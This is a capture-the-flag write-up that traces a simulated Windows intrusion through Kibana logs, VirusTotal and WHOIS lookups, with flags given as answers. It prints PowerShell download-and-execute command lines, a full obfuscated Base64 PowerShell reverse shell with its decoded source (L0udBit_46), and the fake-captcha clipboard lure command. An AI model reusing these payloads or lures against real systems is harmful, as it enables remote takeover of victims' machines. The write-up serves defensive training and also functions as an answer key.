# L0udBit

## L0udBit_01
> As in many companies, our victim company also does not have very well-tuned SIEM. Thousands and thousand of alerts for benign activities are generated every day. But some alerts are forwarded to the security admin's email. One of them is 'Potential PowerShell HackTool Script by Author' and notification with exactly this alert was the sign of a very long day for our admin. So grab some coffee and let's dig in. What is the @timestamp when this alert was first generated? Format: MMM dd, yyyy @ hh:mm:ss.sss

> Elastic SIEM / Kibana is available on the link below, credentials can be found in FAQ / Environment

> https://kibana.guardians.sk

We start by opening Kibana Security Alerts page and look for mentioned alert `Potential PowerShell HackTool Script by Author` where the first timestamp is our answer:

![](img/L0udBit/20250129095537.png)

> Flag: `Jan 16, 2025 @ 17:17:47.751`

## L0udBit_02
> What is the severity of the alert?

Looking at the previous screenshot, we see severity is `high`.
> Flag: `high`

## L0udBit_03
> Who is the author of the rule?

Clicking on the rule name, opens the side panel where we can see the Author.

![](img/L0udBit/20250129101009.png)

> Flag: `Elastic`

## L0udBit_04
> By the rule definition, it detects known PowerShell offensive tooling author's name in PowerShell scripts. Attackers commonly use out-of-the-box offensive tools without modifying the code. When examine the query carefully, we can see there are several strings it is trying to match in an event log. What is the exact string that matched this time?

By clicking first on rule definition, we can see all the strings it tries to match in `powershell.file.script_block_text` field (left screenshot). Then we open the alert details by clicking on the `View details` arrow under `Actions` and alert details panel will open on the left. There we switch to table view and search for `powershell.file.script_block_text` filed (right screenshot). By painstaking comparing the two as the autor or using some more intelligent approach, we see that matching sting is `funoverip`.

![](img/L0udBit/20250129103939.png)

> Flag: `funoverip`

## L0udBit_05
> What is the event.provider of the original winlogbeat event, where this string was found?

By searching for `provider` in the alert details view, we have our next flag:

![](img/L0udBit/20250129104925.png)

> Flag: `Microsoft-Windows-PowerShell`

## L0udBit_06
> What is the event.id of the original winlogbeat event, where this string was found?

Searching for `event.id` in the list of fields will not yield anything, but if we look for `event` and find `event.code` to be the answer:

![](img/L0udBit/20250129105322.png)

> Flag: `4014`

## L0udBit_07
> What is the agent.hostname of the affected computer?

Searching for `agent.hostname` will result in `officeWin9`.

> Flag: `officeWin9`

## L0udBit_08
> What is the IP address of the officeWin9 computer? If it has more network adapters, enter the IP which is used for communication with outside world.

Looking for `ip` in the fields, we see several IPs some IPv4, some IPv6. Consuling the [environment](README.md#environment) we see that the office network is `192.168.12.0/24` so we try `192.168.12.119` and it is the correct answer.

![](img/L0udBit/20250129105829.png)

> Flag: `192.168.12.119`

## L0udBit_09
> What is the name of the user who ran the suspicious powershell script from our initial alert?

Searching for `user.name` in the alert fields, we find `sidonia.borek`.

![](img/L0udBit/20250129110329.png)

> Flag: `sidonia.borek`

## L0udBit_10
> What is the file.name of the suspicious powershell script?

Searching for `file.name` in the alert fields, we find `winPEAS.ps1`.

![](img/L0udBit/20250129110531.png)

> Flag: `winPEAS.ps1`

## L0udBit_11
> What is the full file.path of the winPEAS.ps1 powershell script?

Searching for `file.path` will reveal `C:\Users\Public\winPEAS.ps1`.

> Flag: `C:\Users\Public\winPEAS.ps1`

## L0udBit_12
> What does winPEAS mean?

Googling this exact question will return answer: `Windows Privilege Escalation Awesome Scripts`.

> Flag: `Windows Privilege Escalation Awesome Scripts`

## L0udBit_13
> How the &#@*(# did this script get onto the workstation? What is the CreationUtcTime of the winPEAS.ps1 file? Use exact format as in the message.

For this we need to switch to different dashboard in Kibana so we can search for individual logs. Go to `Analytics->Discovery` and select `winlogbeat-*` in Data view. Then search for `event.category:"file"  AND "winPEAS.ps1"`, ensure timeframe is set to `Wargame`. Only one log will be found, open the log details and in the field search type `CreationUtcTime`.

![](img/L0udBit/20250129111523.png)

> Flag: `2025-01-16 16:09:17.683`

## L0udBit_14
> What is the process.name of the process which created winPEAS.ps1 file?

Looking at the `process.name` field, we see it is `powershell.exe`.

> Flag: `powershell.exe`

## L0udBit_15
> What is the process.pid of the process which created winPEAS.ps1 file?

Search for `process.pid` in the log fields.

> Flag: `6068`

## L0udBit_16
> What is the url from which winPEAS.ps1 script was downloaded?

From previous step, we know that `powershell.exe` with `process.pid:6068` crated the file, so let's filter logs based on this process id and search for `winPEAS.ps1`. We also added useful fields as columns to our main log view to better identify interesting stuff, fields like `file.path`, `winlog.task`, `process.command_line`, `process.pid`, `process.name`, `process.parent.name`, `user.username` and `host.hostname` are among popular fields used.

![](img/L0udBit/20250129112945.png)

Several logs are found, previous one for `File created` event but we also see some process creation events. By clicking on small arrow in top right corner of the `process.command_line` cell to expand the content, we see from where the file was originally downloaded from.

> Flag: `https://raw.githubusercontent.com/peass-ng/PEASS-ng/refs/heads/master/winPEAS/winPEASps1/winPEAS.ps1`

## L0udBit_17
> What was the full process.command_line to download and run winPEAS.ps1 script?

From previous step, we can just copy the contents of the `process.command_line` cell by expending the content and clicking on `Copy value`:

![](img/L0udBit/20250129113838.png)

> Flag: `powershell  -Command "& {Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/peass-ng/PEASS-ng/refs/heads/master/winPEAS/winPEASps1/winPEAS.ps1' -OutFile 'C:\Users\Public\winPEAS.ps1'; powershell -ExecutionPolicy Bypass -File 'C:\Users\Public\winPEAS.ps1' > 'C:\Users\Public\peasout.txt'}"`

## L0udBit_18
> What was the process.parent.name of the powershell command from the previous question?

Searching for the `process.parent.name` in the log details, reveals the answer.

> Flag: `cmd.exe`

## L0udBit_19
> What was the process.parent.name of the cmd.exe from the previous question?

For this task, need to find the pid of the `cmd.exe` process from the previous task. For this we add field `process.parent.pid` in our log view and see that `cmd.exe` has pid `9104`. 

![](img/L0udBit/20250129114435.png)

Now, we set filter `process.pid:9104` and listed logs will reveal the answer:

![](img/L0udBit/20250129120046.png)

> Flag: `UpdaterCore.exe`

## L0udBit_20
> What is the process.executable of the UpdaterCore.exe?

For this we know from previous task that process `UpdatedCore.exe` had pid `6548`. We can now filter for `process.pid:6548` but that will return lot of logs from other hosts, so we add filter for `host.name:officewin9`:

![](img/L0udBit/20250129120340.png)

This will return several logs, so looking at details of one and searching for field `process.executable` will show us the answer:

![](img/L0udBit/20250129120511.png)

> Flag: `C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys\UpdaterCore.exe`

## L0udBit_21
> What is the md5 hash of the UpdaterCore.exe?

Looking for `md5` in the same log details, will provide the answer. 

![](img/L0udBit/20250129120731.png)

NOTE: in our case `process.hash.md5` is equal to `file.hash.md5` of the executable because it was simply loaded and executed without in-memory modification. However, another way, and maybe more correct, was to filter for `host.name:officewin9` and `file.hash.md5:exists` and search for `UpdaterCore.exe`, which will find the answer:

![](img/L0udBit/20250129121540.png)

> Flag: `cef02023b40e51c7e4779ac637e0501d`

## L0udBit_22
> What is the compilation timestamp of the UpdaterCore.exe? Format: YYYY-MM-DD HH:mm:ss UTC

Compilation timestamp of the `UpdaterCore.exe` will not be in the security logs. For this we need to employ [OSINT](https://en.wikipedia.org/wiki/Open-source_intelligence) technique and turn to our trusty [VirusTotal](https://www.virustotal.com/) where best is to search for the file by the file hash which we have from previous step.
Then looking at the `Details` tab on the VirusTotal page, we see `Compilation Timestamp` under `Portable Executable Info` section:

![](img/L0udBit/20250129122158.png)

> Flag: `2025-01-16 11:15:36 UTC`

## L0udBit_23
> What is the name of the Crowdsourced IDS rule which would match traffic from this malicious process?

This one was interesting, never heard of `Crowdsourced IDS rules` but bit of googling and browsing through VirusTotal, answer was found under the `Behavior` tab of the VirusTotal page:

![](img/L0udBit/20250129122813.png)

> Flag: `SSLBL: Malicious JA3 SSL-Client Fingerprint detected (TrickBot)`

## L0udBit_24
> UpdaterCore.exe is detected by many AVs as the popular C2 framework. What is the name of this framework?

For this we tried to use ChatGPT by asking following question: `UpdaterCore.exe file with hash 23da17a3484f8b5e9c4d8f20c56a4e87e41f10ab84ce68528ece4494c17c87d0 is detected by many AVs as the popular C2 framework. What is the name of this framework?` It responded with `Covenant` but that was not accepted. Then did some old fashioned googling for "C2 frameworks" and two names were popping up: `Covenant` and `Havoc`. Then realized that words `Havokiz` and `Havoc` appear in VirusTotal results... so tried `Havoc` and it was accepted.

NOTE: there is `Family labels` on the VirusTotal `Detection` page that also contained the answer:

![](img/L0udBit/20250129123405.png)

> Flag: `havoc`

## L0udBit_25
> OSINT time :) What is the full name of the Havoc developer? Format: Name Surname

I'm not good at OSINT, always get tangled in some rabbit hole. First found the name of the author (Paul) on his web https://5pider.net/about and after reading his whole twitter feed, finally googled `havoc framework "Paul"` which brought me to https://havocframework.com/docs/welcome:

![](img/L0udBit/20250129174839.png)

> Flag: `Paul Ungur`

## L0udBit_26
> When was the UpdaterCore.exe dropped on the file system? What is the CreationUtcTime of the UpdaterCore.exe?

Filter for `host.name:officewin9` and `event.categoryaction: File created (rule: FileCreate)` and search for `UpdaterCore.exe`, look for the `CreationUtcTime` in the log details:

![](img/L0udBit/20250129135435.png)

> Flag: `2025-01-16 16:07:20.182`

## L0udBit_27
> What is the full process.command_line which was used to download and execute UpdaterCore.exe?

Searched for `UpdaterCore.exe` and filter `process.command_line:exists`. There were lot of logs so found the oldest one and looked at the log details:

![](img/L0udBit/20250129135953.png)

> Flag: `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command "& {Invoke-WebRequest -Uri 'http://72.21.192.5/UpdaterCore.exe' -OutFile 'c:\windows\system32\microsoft\crypto\rsa\machinekeys\UpdaterCore.exe';Start-Process -FilePath 'c:\windows\system32\microsoft\crypto\rsa\machinekeys\UpdaterCore.exe'}"`

## L0udBit_29
> What is the IP address to which UpdaterCore.exe established a network connection?

Search for `winlog.task : "Network connection detected (rule: NetworkConnect)" AND process.name:"UpdaterCore.exe"` and filter on `host.name:officewin9`.
Answer is in the `destination.ip` field:

![](img/L0udBit/20250129152907.png)

> Flag: `87.250.250.42`

## L0udBit_30
> What is the geo country name where this IP is located?

We can use OSINT for this, but we can also use yet another Kibana data source `filebeat-*` where the network connections are logged by the company firewall.
When we search here for logs related to destination IP and the source IP of the `officewin9` PC: `destination.ip:"87.250.250.42"  and source.ip:"192.168.12.119"`, by looking at the log detail we see destination country name:

![](img/L0udBit/20250129153645.png)

> Flag: `Russia`

## L0udBit_31
> Shortly after execution of UpdaterCore.exe, adversary made changes to the registry to make sure he will be able to get back to the system even after reboot. What is the full registry.path that was created?

Here we switch back to the `winlogbeat-*` data source and set filters for the `host.name:officewin9`. We can recall from previous tasks that `UpdaterCore.exe` had process.id `6548` ([L0udBit_20](#l0udbit_20)) and if we use that to filter and show the `registry.path` field we see several results:

![](img/L0udBit/20250129170243.png)

However, those are not related to ensuring attacker will be able to get back to system after reboot. So we need to look further.  We can check if the `UpdaterCore.exe` created some child process that modified the registry, so we update the filter to `process.parent.pid:6548`. We noticed suspicious looking process `cmd.exe` that executed `reg add` command:

![](img/L0udBit/20250129171502.png)

But we still do not see `registry.path`, so we go further, set `process.parent.pid:8172` to see if the `reg` process created the key but still no luck, but we see that the process id of `reg.exe` is `8124` so we set filter for `process.pid:8124` and finally we have records for `registry.path`:

![](img/L0udBit/20250129172318.png)

NOTE: this could be also solved more quickly and intelligently by leveraging `MITRE ATT&CK` framework and looking under `Persistence` tactic ("be able to get back to the system"), under the `Boot or Logon Autostart Execution` technique ("even after reboot") and `Registry Run Keys / Startup Folder` sub-technique ("adversary made changes to the registry"): https://attack.mitre.org/techniques/T1547/001/. 
Right there the listed Windows `run keys` that will cause the program referenced to be executed when a user logs in. So, simply searching for `registry.path:*CurrentVersion\\Run*` would quickly reveal the correct answer.

> Flag: `HKU\S-1-5-21-2918068850-3100921079-2521427286-1308\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpadate`

## L0udBit_32
> What is the registry.data.string written in the WinUpadate key?

Looking at the log details we found in previous task, we see:

![](img/L0udBit/20250129201403.png)

> Flag: `c:\windows\system32\microsoft\crypto\rsa\machinekeys\UpdaterCore.exe`

## L0udBit_33
> What is the name of the MITRE ATT&CK tactic utilized?

As mentioned in the [L0udBit_31](#l0udbit_31) under the `Note`, tactic utilized is called `Persistence`.

> Flag: `Persistence`

## L0udBit_34
> What is the name of the MITRE ATT&CK technique utilized?

As mentioned in the [L0udBit_31](#l0udbit_31) under the `Note`, technique utilized is called `Boot or Logon Autostart Execution`.

> Flag: `Boot or Logon Autostart Execution`

## L0udBit_35
> And finally, what is the name of the MITRE ATT&CK subtechnique utilized?

As mentioned in the [L0udBit_31](#l0udbit_31) under the `Note`, subtechnique utilized is called `Registry Run Keys / Startup Folder`.

> Flag: `Registry Run Keys / Startup Folder`

## L0udBit_36
> What is the process.parent.pid of the powershell process which downloaded and executed UpdaterCore.exe?

We can use the same search as for [L0udBit_27](#l0udbit_27) and just add `process.parent.pid` to the display column:

![](img/L0udBit/20250129202919.png)

> Flag: `5824`

## L0udBit_37
> What is the process.name of the process with process.pid 5824?

Same search as previous step, just add `process.parent.name` to the display column:

![](img/L0udBit/20250129203145.png)

> Flag: `powershell.exe`

## L0udBit_38
> Seems that this powershell is the source of quite an enumeration activity. What is the process.command_line of the first process run by powershell with process.pid 5824?

The "trick" was to filter for `process.parent.pid:5824` instead of what task asks, however the first command that we saw is not the answer but second: `C:\Windows\system32\whoami.exe`. The reason is that first command_line that appears is often seen when launching legacy console-based applications and can be ignored. Also the question stated that command was for enumeration activity which `whoami.exe` definitely belongs to.

![](img/L0udBit/20250129203423.png)

> Flag: `"C:\Windows\system32\whoami.exe"`

## L0udBit_39
> What is the process.command_line run by adversary to get the name of the Domain controller?

We used previous query and went through commands ran, and tried to figure out something that looked like it could be related to Domain Controller, and `dclist` looked like something related. But then we also checked `nltest.exe` documentation to confirm: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731935(v=ws.11).

![](img/L0udBit/20250129204745.png)

> Flag: `"C:\Windows\system32\nltest.exe" /dclist:`

## L0udBit_40
> What process.command_line was used to find out the public IP address of the compromised computer?

Again, we were looking at the commands from the previous filter, and among `ipconfig`, `whoami.exe` and other commands this one looked like something it could be used to retrieve information about public IP.

![](img/L0udBit/20250129205031.png)

> Flag: `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" curl ifconfig.me`

## L0udBit_41
> What is the event.code of the DNS query Sysmon event?

For this we simply used ChatGPT and asked "What is the event.code of the DNS query Sysmon event?". Answer was `22` but to be sure we verified that with the search `event.code:22` and find the log of `curl ifconfig.me` command from previous task which confirmed that ChatGPT was not hallucinating:

![](img/L0udBit/20250129221557.png)

> Flag: `22`

## L0udBit_42
> What is the source.port of the network connection established between the host and ifconfig.me?

DNS query for the `ifconfig.me` returned `34.160.111.145`, we can see that in previous screenshot. So to search for the answer, we need to filter logs for the `destination.ip:34.160.111.145`:

![](img/L0udBit/20250130090309.png)

Query returned two results, and we tried the first one `51192` but it was not accepted, however the second one `51193` was accepted. After looking more closely the first entry is related to process id `5824` which is parent of `5372` and related to powershell script block execution of the actual `curl ifconfig.me`. Not sure why also the process `5824` established network connection when it only had to spawn child processes.

> Flag: `51193`

## L0udBit_43
> We still need to find out why all these enumeration commands were run. Let's climb a step higher on the process tree. What is the process.command_line of the powershell command which ran all enumeration commands from previous challenges?

From [L0udBit_38](#l0udbit_38) we know that filter `process.parent.pid:5824` showed commands that spawned various enumeration commands, so we add column with `process.parent.command_line` which gave us the answer:

![](img/L0udBit/20250130092841.png)

> Flag: `"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -WindowStyle Hidden -Command "iex (iwr 'http://78.141.223.161/revshell.txt' -UseBasicParsing).Content"`

## L0udBit_44
> What is the IP address from which revshell.txt was downloaded?

From previous task we see that revshell.txt was downloaded from `http://78.141.223.161/revshell.txt`

> Flag: `78.141.223.161`

## L0udBit_45
> What is the AS organization name of the IP address, from which revshell.txt was downloaded?

Via VirusTotal, searched the `78.141.223.161` and found the AS name.

![](img/L0udBit/20250130093238.png)

> Flag:`AS-VULTR`

## L0udBit_46
> ANALYZE revshell.txt and find the flag Format: BC{somerandomstring}

Opened the `revshell.txt`, which was script, but had been Base64 encoded.
```
$run = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozsk54K9ID0gNDk7JOiajiA9IDU1OyR7I30gPSAiIjskaCA9ICIjIjsk5LiJID0gNTM7JGRvZyA9IDUyOyTmsLQgPSAiSU8uU3RyZWFtV3JpdGVyIjsgICA7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7OzsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJG5fZSA9IDU0Ow0KJHMgPSAiVyI7DQokZnVuY3Rpb24gPSAiZnVuY3Rpb24iWzVdOzs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozskbl9yID0gNTY7JHUxZyA9IDQ4OyRlY2hvID0iIjskcHJpbnQgPSAkUysiaCIrJGZ1bmN0aW9uKyJsZSI7Ozs7Ozs7OyRmdW5jdGlvbiA9ICJCQyI7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7JHUxcSA9IDUxOw0KJGggKyAkZWNobzsjICRwcmludDs7Ozs7Ozs7Ozs7Ozs7Ozs7IDs7Ozs7Ozs7Ozs7Ozs7OzsNCiTkuYEgPSBbY2hhcl0k54K9KyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbY2hhcl0k6JqOK1tjaGFyXSTkuIkrIi4iK1tjaGFyXSRkb2crW2NoYXJdJOS4iSsiLiIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgK1tjaGFyXSTngr0rW2NoYXJdJOiajitbY2hhcl0kbl9lKyIuIitbY2hhcl0kbl9yK1tjaGFyXSTngr07DQok54GrID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJOS5gSAsIDgwODApOzs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7DQok54Gr54GrID0gJOeBqy5HZXRTdHJlYW0oKTs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7OyTkuLwgPSAkZnVuY3Rpb24gKyAie0QiICsgW2NoYXJdJHUxcSArIFtjaGFyXSR1MWcgKyJiZnUiICsgW2NoYXJdJOS4iSArImNhdCIgKyBbY2hhcl0k54K9ICsgW2NoYXJdJHUxZyArICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAibl9yIiArIFtjaGFyXSR1MXEgKyAidiIgKyBbY2hhcl0k5LiJICsgImgiICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICArIFtjaGFyXSR1MXEgKyJsbH0iOw0KJOm+jeeBqyA9IE5ldy1PYmplY3QgLVR5cGVOYW1lICTmsLQgLUFyZ3VtZW50TGlzdCAk54Gr54GrO2Z1bmN0aW9uIFdyaXRlVG9TdHJlYW0gKCRTdHJpbmcpIHtbYnl0ZVtdXSRzY3JpcHQ6QnVmZmVyID0gICAgICAgICAgICAgMC4uJOeBqy5SRUNFaXZlQnVmZmVyU2l6ZSB8ICUgezB9Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozsk6b6N54GrLldyaXRlKCRTdHJpbmcgKyAnU0hFTEw+ICcpOyMgZWNobyAk5Li8Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7OzsNCiTpvo3ngasuRmx1c2goKX1Xcml0ZVRvU3RyZWFtICcnO3doaWxlKCgkQnl0ZXNSZWFkID0gJOeBq+eBqy5SZWFkKCRCdWZmZXIsIDAsICRCdWZmZXIuTGVuZ3RoKSkgLWd0IDApIHskQ29tbWFuZCA9IChbdGV4dC5lbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkQnVmZmVyLCAwLCAkQnl0ZXNSZWFkIC0gMSk7JOS4iCA9IHRyeSB7SW52b2tlLUV4cHJlc3Npb24gJENvbW1hbmQgMj4mMSB8IE91dC1TdHJpbmd9IGNhdGNoIHskXyB8IE91dC1TdHJpbmd9V3JpdGVUb1N0cmVhbSAoJOS4iCl9JOm+jeeBqy5DbG9zZSgpOzs7Ozs7Ozs7Ozs7OzsNCjs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs='));Invoke-Expression $run
```

after decoding in [CyberChef](https://gchq.github.io/CyberChef):
```
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;$炽 = 49;$蚎 = 55;${#} = "";$h = "#";$三 = 53;$dog = 52;$水 = "IO.StreamWriter";   ;;;;;;;;;;;;;;;;;;;;;;;;;;;                                                                                                                         $n_e = 54;
$s = "W";
$function = "function"[5];;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;$n_r = 56;$u1g = 48;$echo ="";$print = $S+"h"+$function+"le";;;;;;;;$function = "BC";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;$u1q = 51;
$h + $echo;# $print;;;;;;;;;;;;;;;;; ;;;;;;;;;;;;;;;;
$乁 = [char]$炽+                                                                                                             [char]$蚎+[char]$三+"."+[char]$dog+[char]$三+"."                                                                                                                                                                         +[char]$炽+[char]$蚎+[char]$n_e+"."+[char]$n_r+[char]$炽;
$火 = New-Object Net.Sockets.TCPClient($乁 , 8080);;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
$火火 = $火.GetStream();;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;$丼 = $function + "{D" + [char]$u1q + [char]$u1g +"bfu" + [char]$三 +"cat" + [char]$炽 + [char]$u1g +                                                                                                                                               "n_r" + [char]$u1q + "v" + [char]$三 + "h"                                                                                               + [char]$u1q +"ll}";
$龍火 = New-Object -TypeName $水 -ArgumentList $火火;function WriteToStream ($String) {[byte[]]$script:Buffer =             0..$火.RECEiveBufferSize | % {0};;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;$龍火.Write($String + 'SHELL> ');# echo $丼;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
$龍火.Flush()}WriteToStream '';while(($BytesRead = $火火.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$丈 = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($丈)}$龍火.Close();;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
```

The `$function` string had `BC{` string inside. So we started decoding from chars the folowing sequence
```
$function + "{D" + [char]$u1q + [char]$u1g +"bfu" + [char]$三 +"cat" + [char]$炽 + [char]$u1g +                                                                                                                                               "n_r" + [char]$u1q + "v" + [char]$三 + "h"                                                                                               + [char]$u1q +"ll}";
```

Which translated to `{D30bfu5cat10n_r3v5h3ll}` and the solution is `BC{D30bfu5cat10n_r3v5h3ll}`

NOTE: ChatGPT was also successful in decoding and finding the flag after few prompts.

> Flag: `BC{D30bfu5cat10n_r3v5h3ll}`

## L0udBit_47
> Very shortly after executing the revshell.txt, computer connected to the external IP address. What was the IP address?

We set timeframe from `17:00` to `17:10` as that is timeframe when `revshell.txt` was executed and searched for `winlog.task : "Network connection detected (rule: NetworkConnect)"`

![](img/L0udBit/20250130094518.png)

We see several IP, we know that `78.141.223.161 ` is the one from which revshell.txt was downloaded so we try next one and it was accepted answer.

> Flag: `175.45.176.81`

## L0udBit_48
> What was the destination port used to connect?

Looking at log details from previous task, we see that the destination port is `8080`:

![](img/L0udBit/20250130094752.png)

> Flag: `8080`

## L0udBit_49
> What is the destination.geo.country_name of the IP address to which our malicious reverse shell connected?

For this we switch data view to `filebeat-*` and filter for `destination.ip:175.45.176.81` and leaving time frame from `17:00` to `17:10` and we will find the two network connections to `175.45.176.81` on port `8080`.
Looking at the log details and displaying `destination.geo.country_name` we will find the answer:

![](img/L0udBit/20250130095941.png)

> Flag: `North Korea`

## L0udBit_50
> What is the destination.as.organization.name?

We look for the `destination.as.organization.name` in the log details:

![](img/L0udBit/20250130100109.png)

> Flag: `Ryugyong-dong`

## L0udBit_51
> Our firewall detected this connection and generated alert in the logs. What was the panw.panos.threat.name?

In the same log as previous tasks, we search for `panw.panos.threat.name`:

![](img/L0udBit/20250130101032.png)

> Flag: `TCP Shell Command Detection`

## L0udBit_52
> Let's pivot more on the IP address from which revshell.txt was downloaded. What is the domain which resolves to this IP address? Ignore any old domain.

We went back to VirusTotal page where we searched for `78.141.223.161` and checked `Relations` tab:

![](img/L0udBit/20250130101301.png)

> Flag: `free-web-captcha.site`

## L0udBit_53
> When was the domain name registered? Format: YYYY-MM-DD

In VirusTotal, we now search for `free-web-captcha.site` and under `Details` tab, under `Whois Lookup` section we see when domain was registered:

![](img/L0udBit/20250130101632.png)

> Flag: `2025-01-10`

## L0udBit_54
> What is the Registrar name? Format: Somecompany s.r.o.

Registrar name in VirusTotal is for premium membership, since we're on the cheap, we'll try another source: https://who.is/. Searching for `free-web-captcha.site` will reveal Registrar name:

![](img/L0udBit/20250130102045.png)

> Flag: `Gransy s.r.o.`

## L0udBit_55
> What is the Registrant organization? Format: Some Othercompany s.r.o.

Further down on the who.is page, we find this info:

![](img/L0udBit/20250130102204.png)

> Flag: `Binary Confidence s.r.o.`

## L0udBit_56
> Gotcha! Fake website posing as captcha verification, but with a bonus - little surprise in your clipboard. This is the way how adversaries often deceive victims wanting to watch free movies or download free software to run malicious commands and get access to their computers. Analyze the webpage and find the flag. Format: BC{somerandomstring}

Opening https://78.141.223.161 for first time we see the `Legal Disclaimer` that this part of simulated scenario in CTF contest. Clicking `I Agree` we're presented with captcha like page to verify we're humans: 

![](img/L0udBit/20250130102551.png)

Opening view page source, we notice that script that runs powershell to download revshell.txt has a strange looking comment on line 104:

![](img/L0udBit/20250130102846.png)

Base64 decrypt `QkN7dDAwX2VhNXl9` reveals the answer.

Note: this is the entry point for the attackers, with this fake captcha page, when user clicked `I am human` they activated the script that loaded malicious powershell command into clipboard (`powershell -WindowStyle Hidden -Command "iex (iwr 'http://78.141.223.161/revshell.txt' -UseBasicParsing).Content"`), and then they tricked user to opening Windows command line `Win + R` and pasting the clipboard content `CTRL + V` and executing it `Enter`.

![](img/L0udBit/20250130103319.png)

> Flag: `BC{t00_ea5y}`

## L0udBit_57
> There may by another flag hidden in the domain records of the fake captcha domain. Can you find it? Format BC{somerandomstring}

DNS can hold quite a [lot of different record types](https://en.wikipedia.org/wiki/List_of_DNS_record_types) but most common are A (Address record), NS (Name server), SOA (Start of authority ), MX (Mail exchange) and TXT (Text record). Usually the TXT one can be used to hold interesting information in CTF games, unfortunately who.is did not show txt record, so looking back at VirusTotal `Details` tab, under the `Last DNS records` we see interesting value:

![](img/L0udBit/20250130104523.png)

Doing Base64 decode of `T1B7UUFGXzFhczB9` resulted in `OP{QAF_1as0}` which did not match the format `BC{...}` entirely. Because only the alphanumeric characters were off, we suspected some kind of simple substitution cypher was used, so we tried several in CyberChef and the [ROT13](https://en.wikipedia.org/wiki/ROT13) provided the answer:

![](img/L0udBit/20250130105023.png)

> Flag: `BC{DNS_1nf0}`

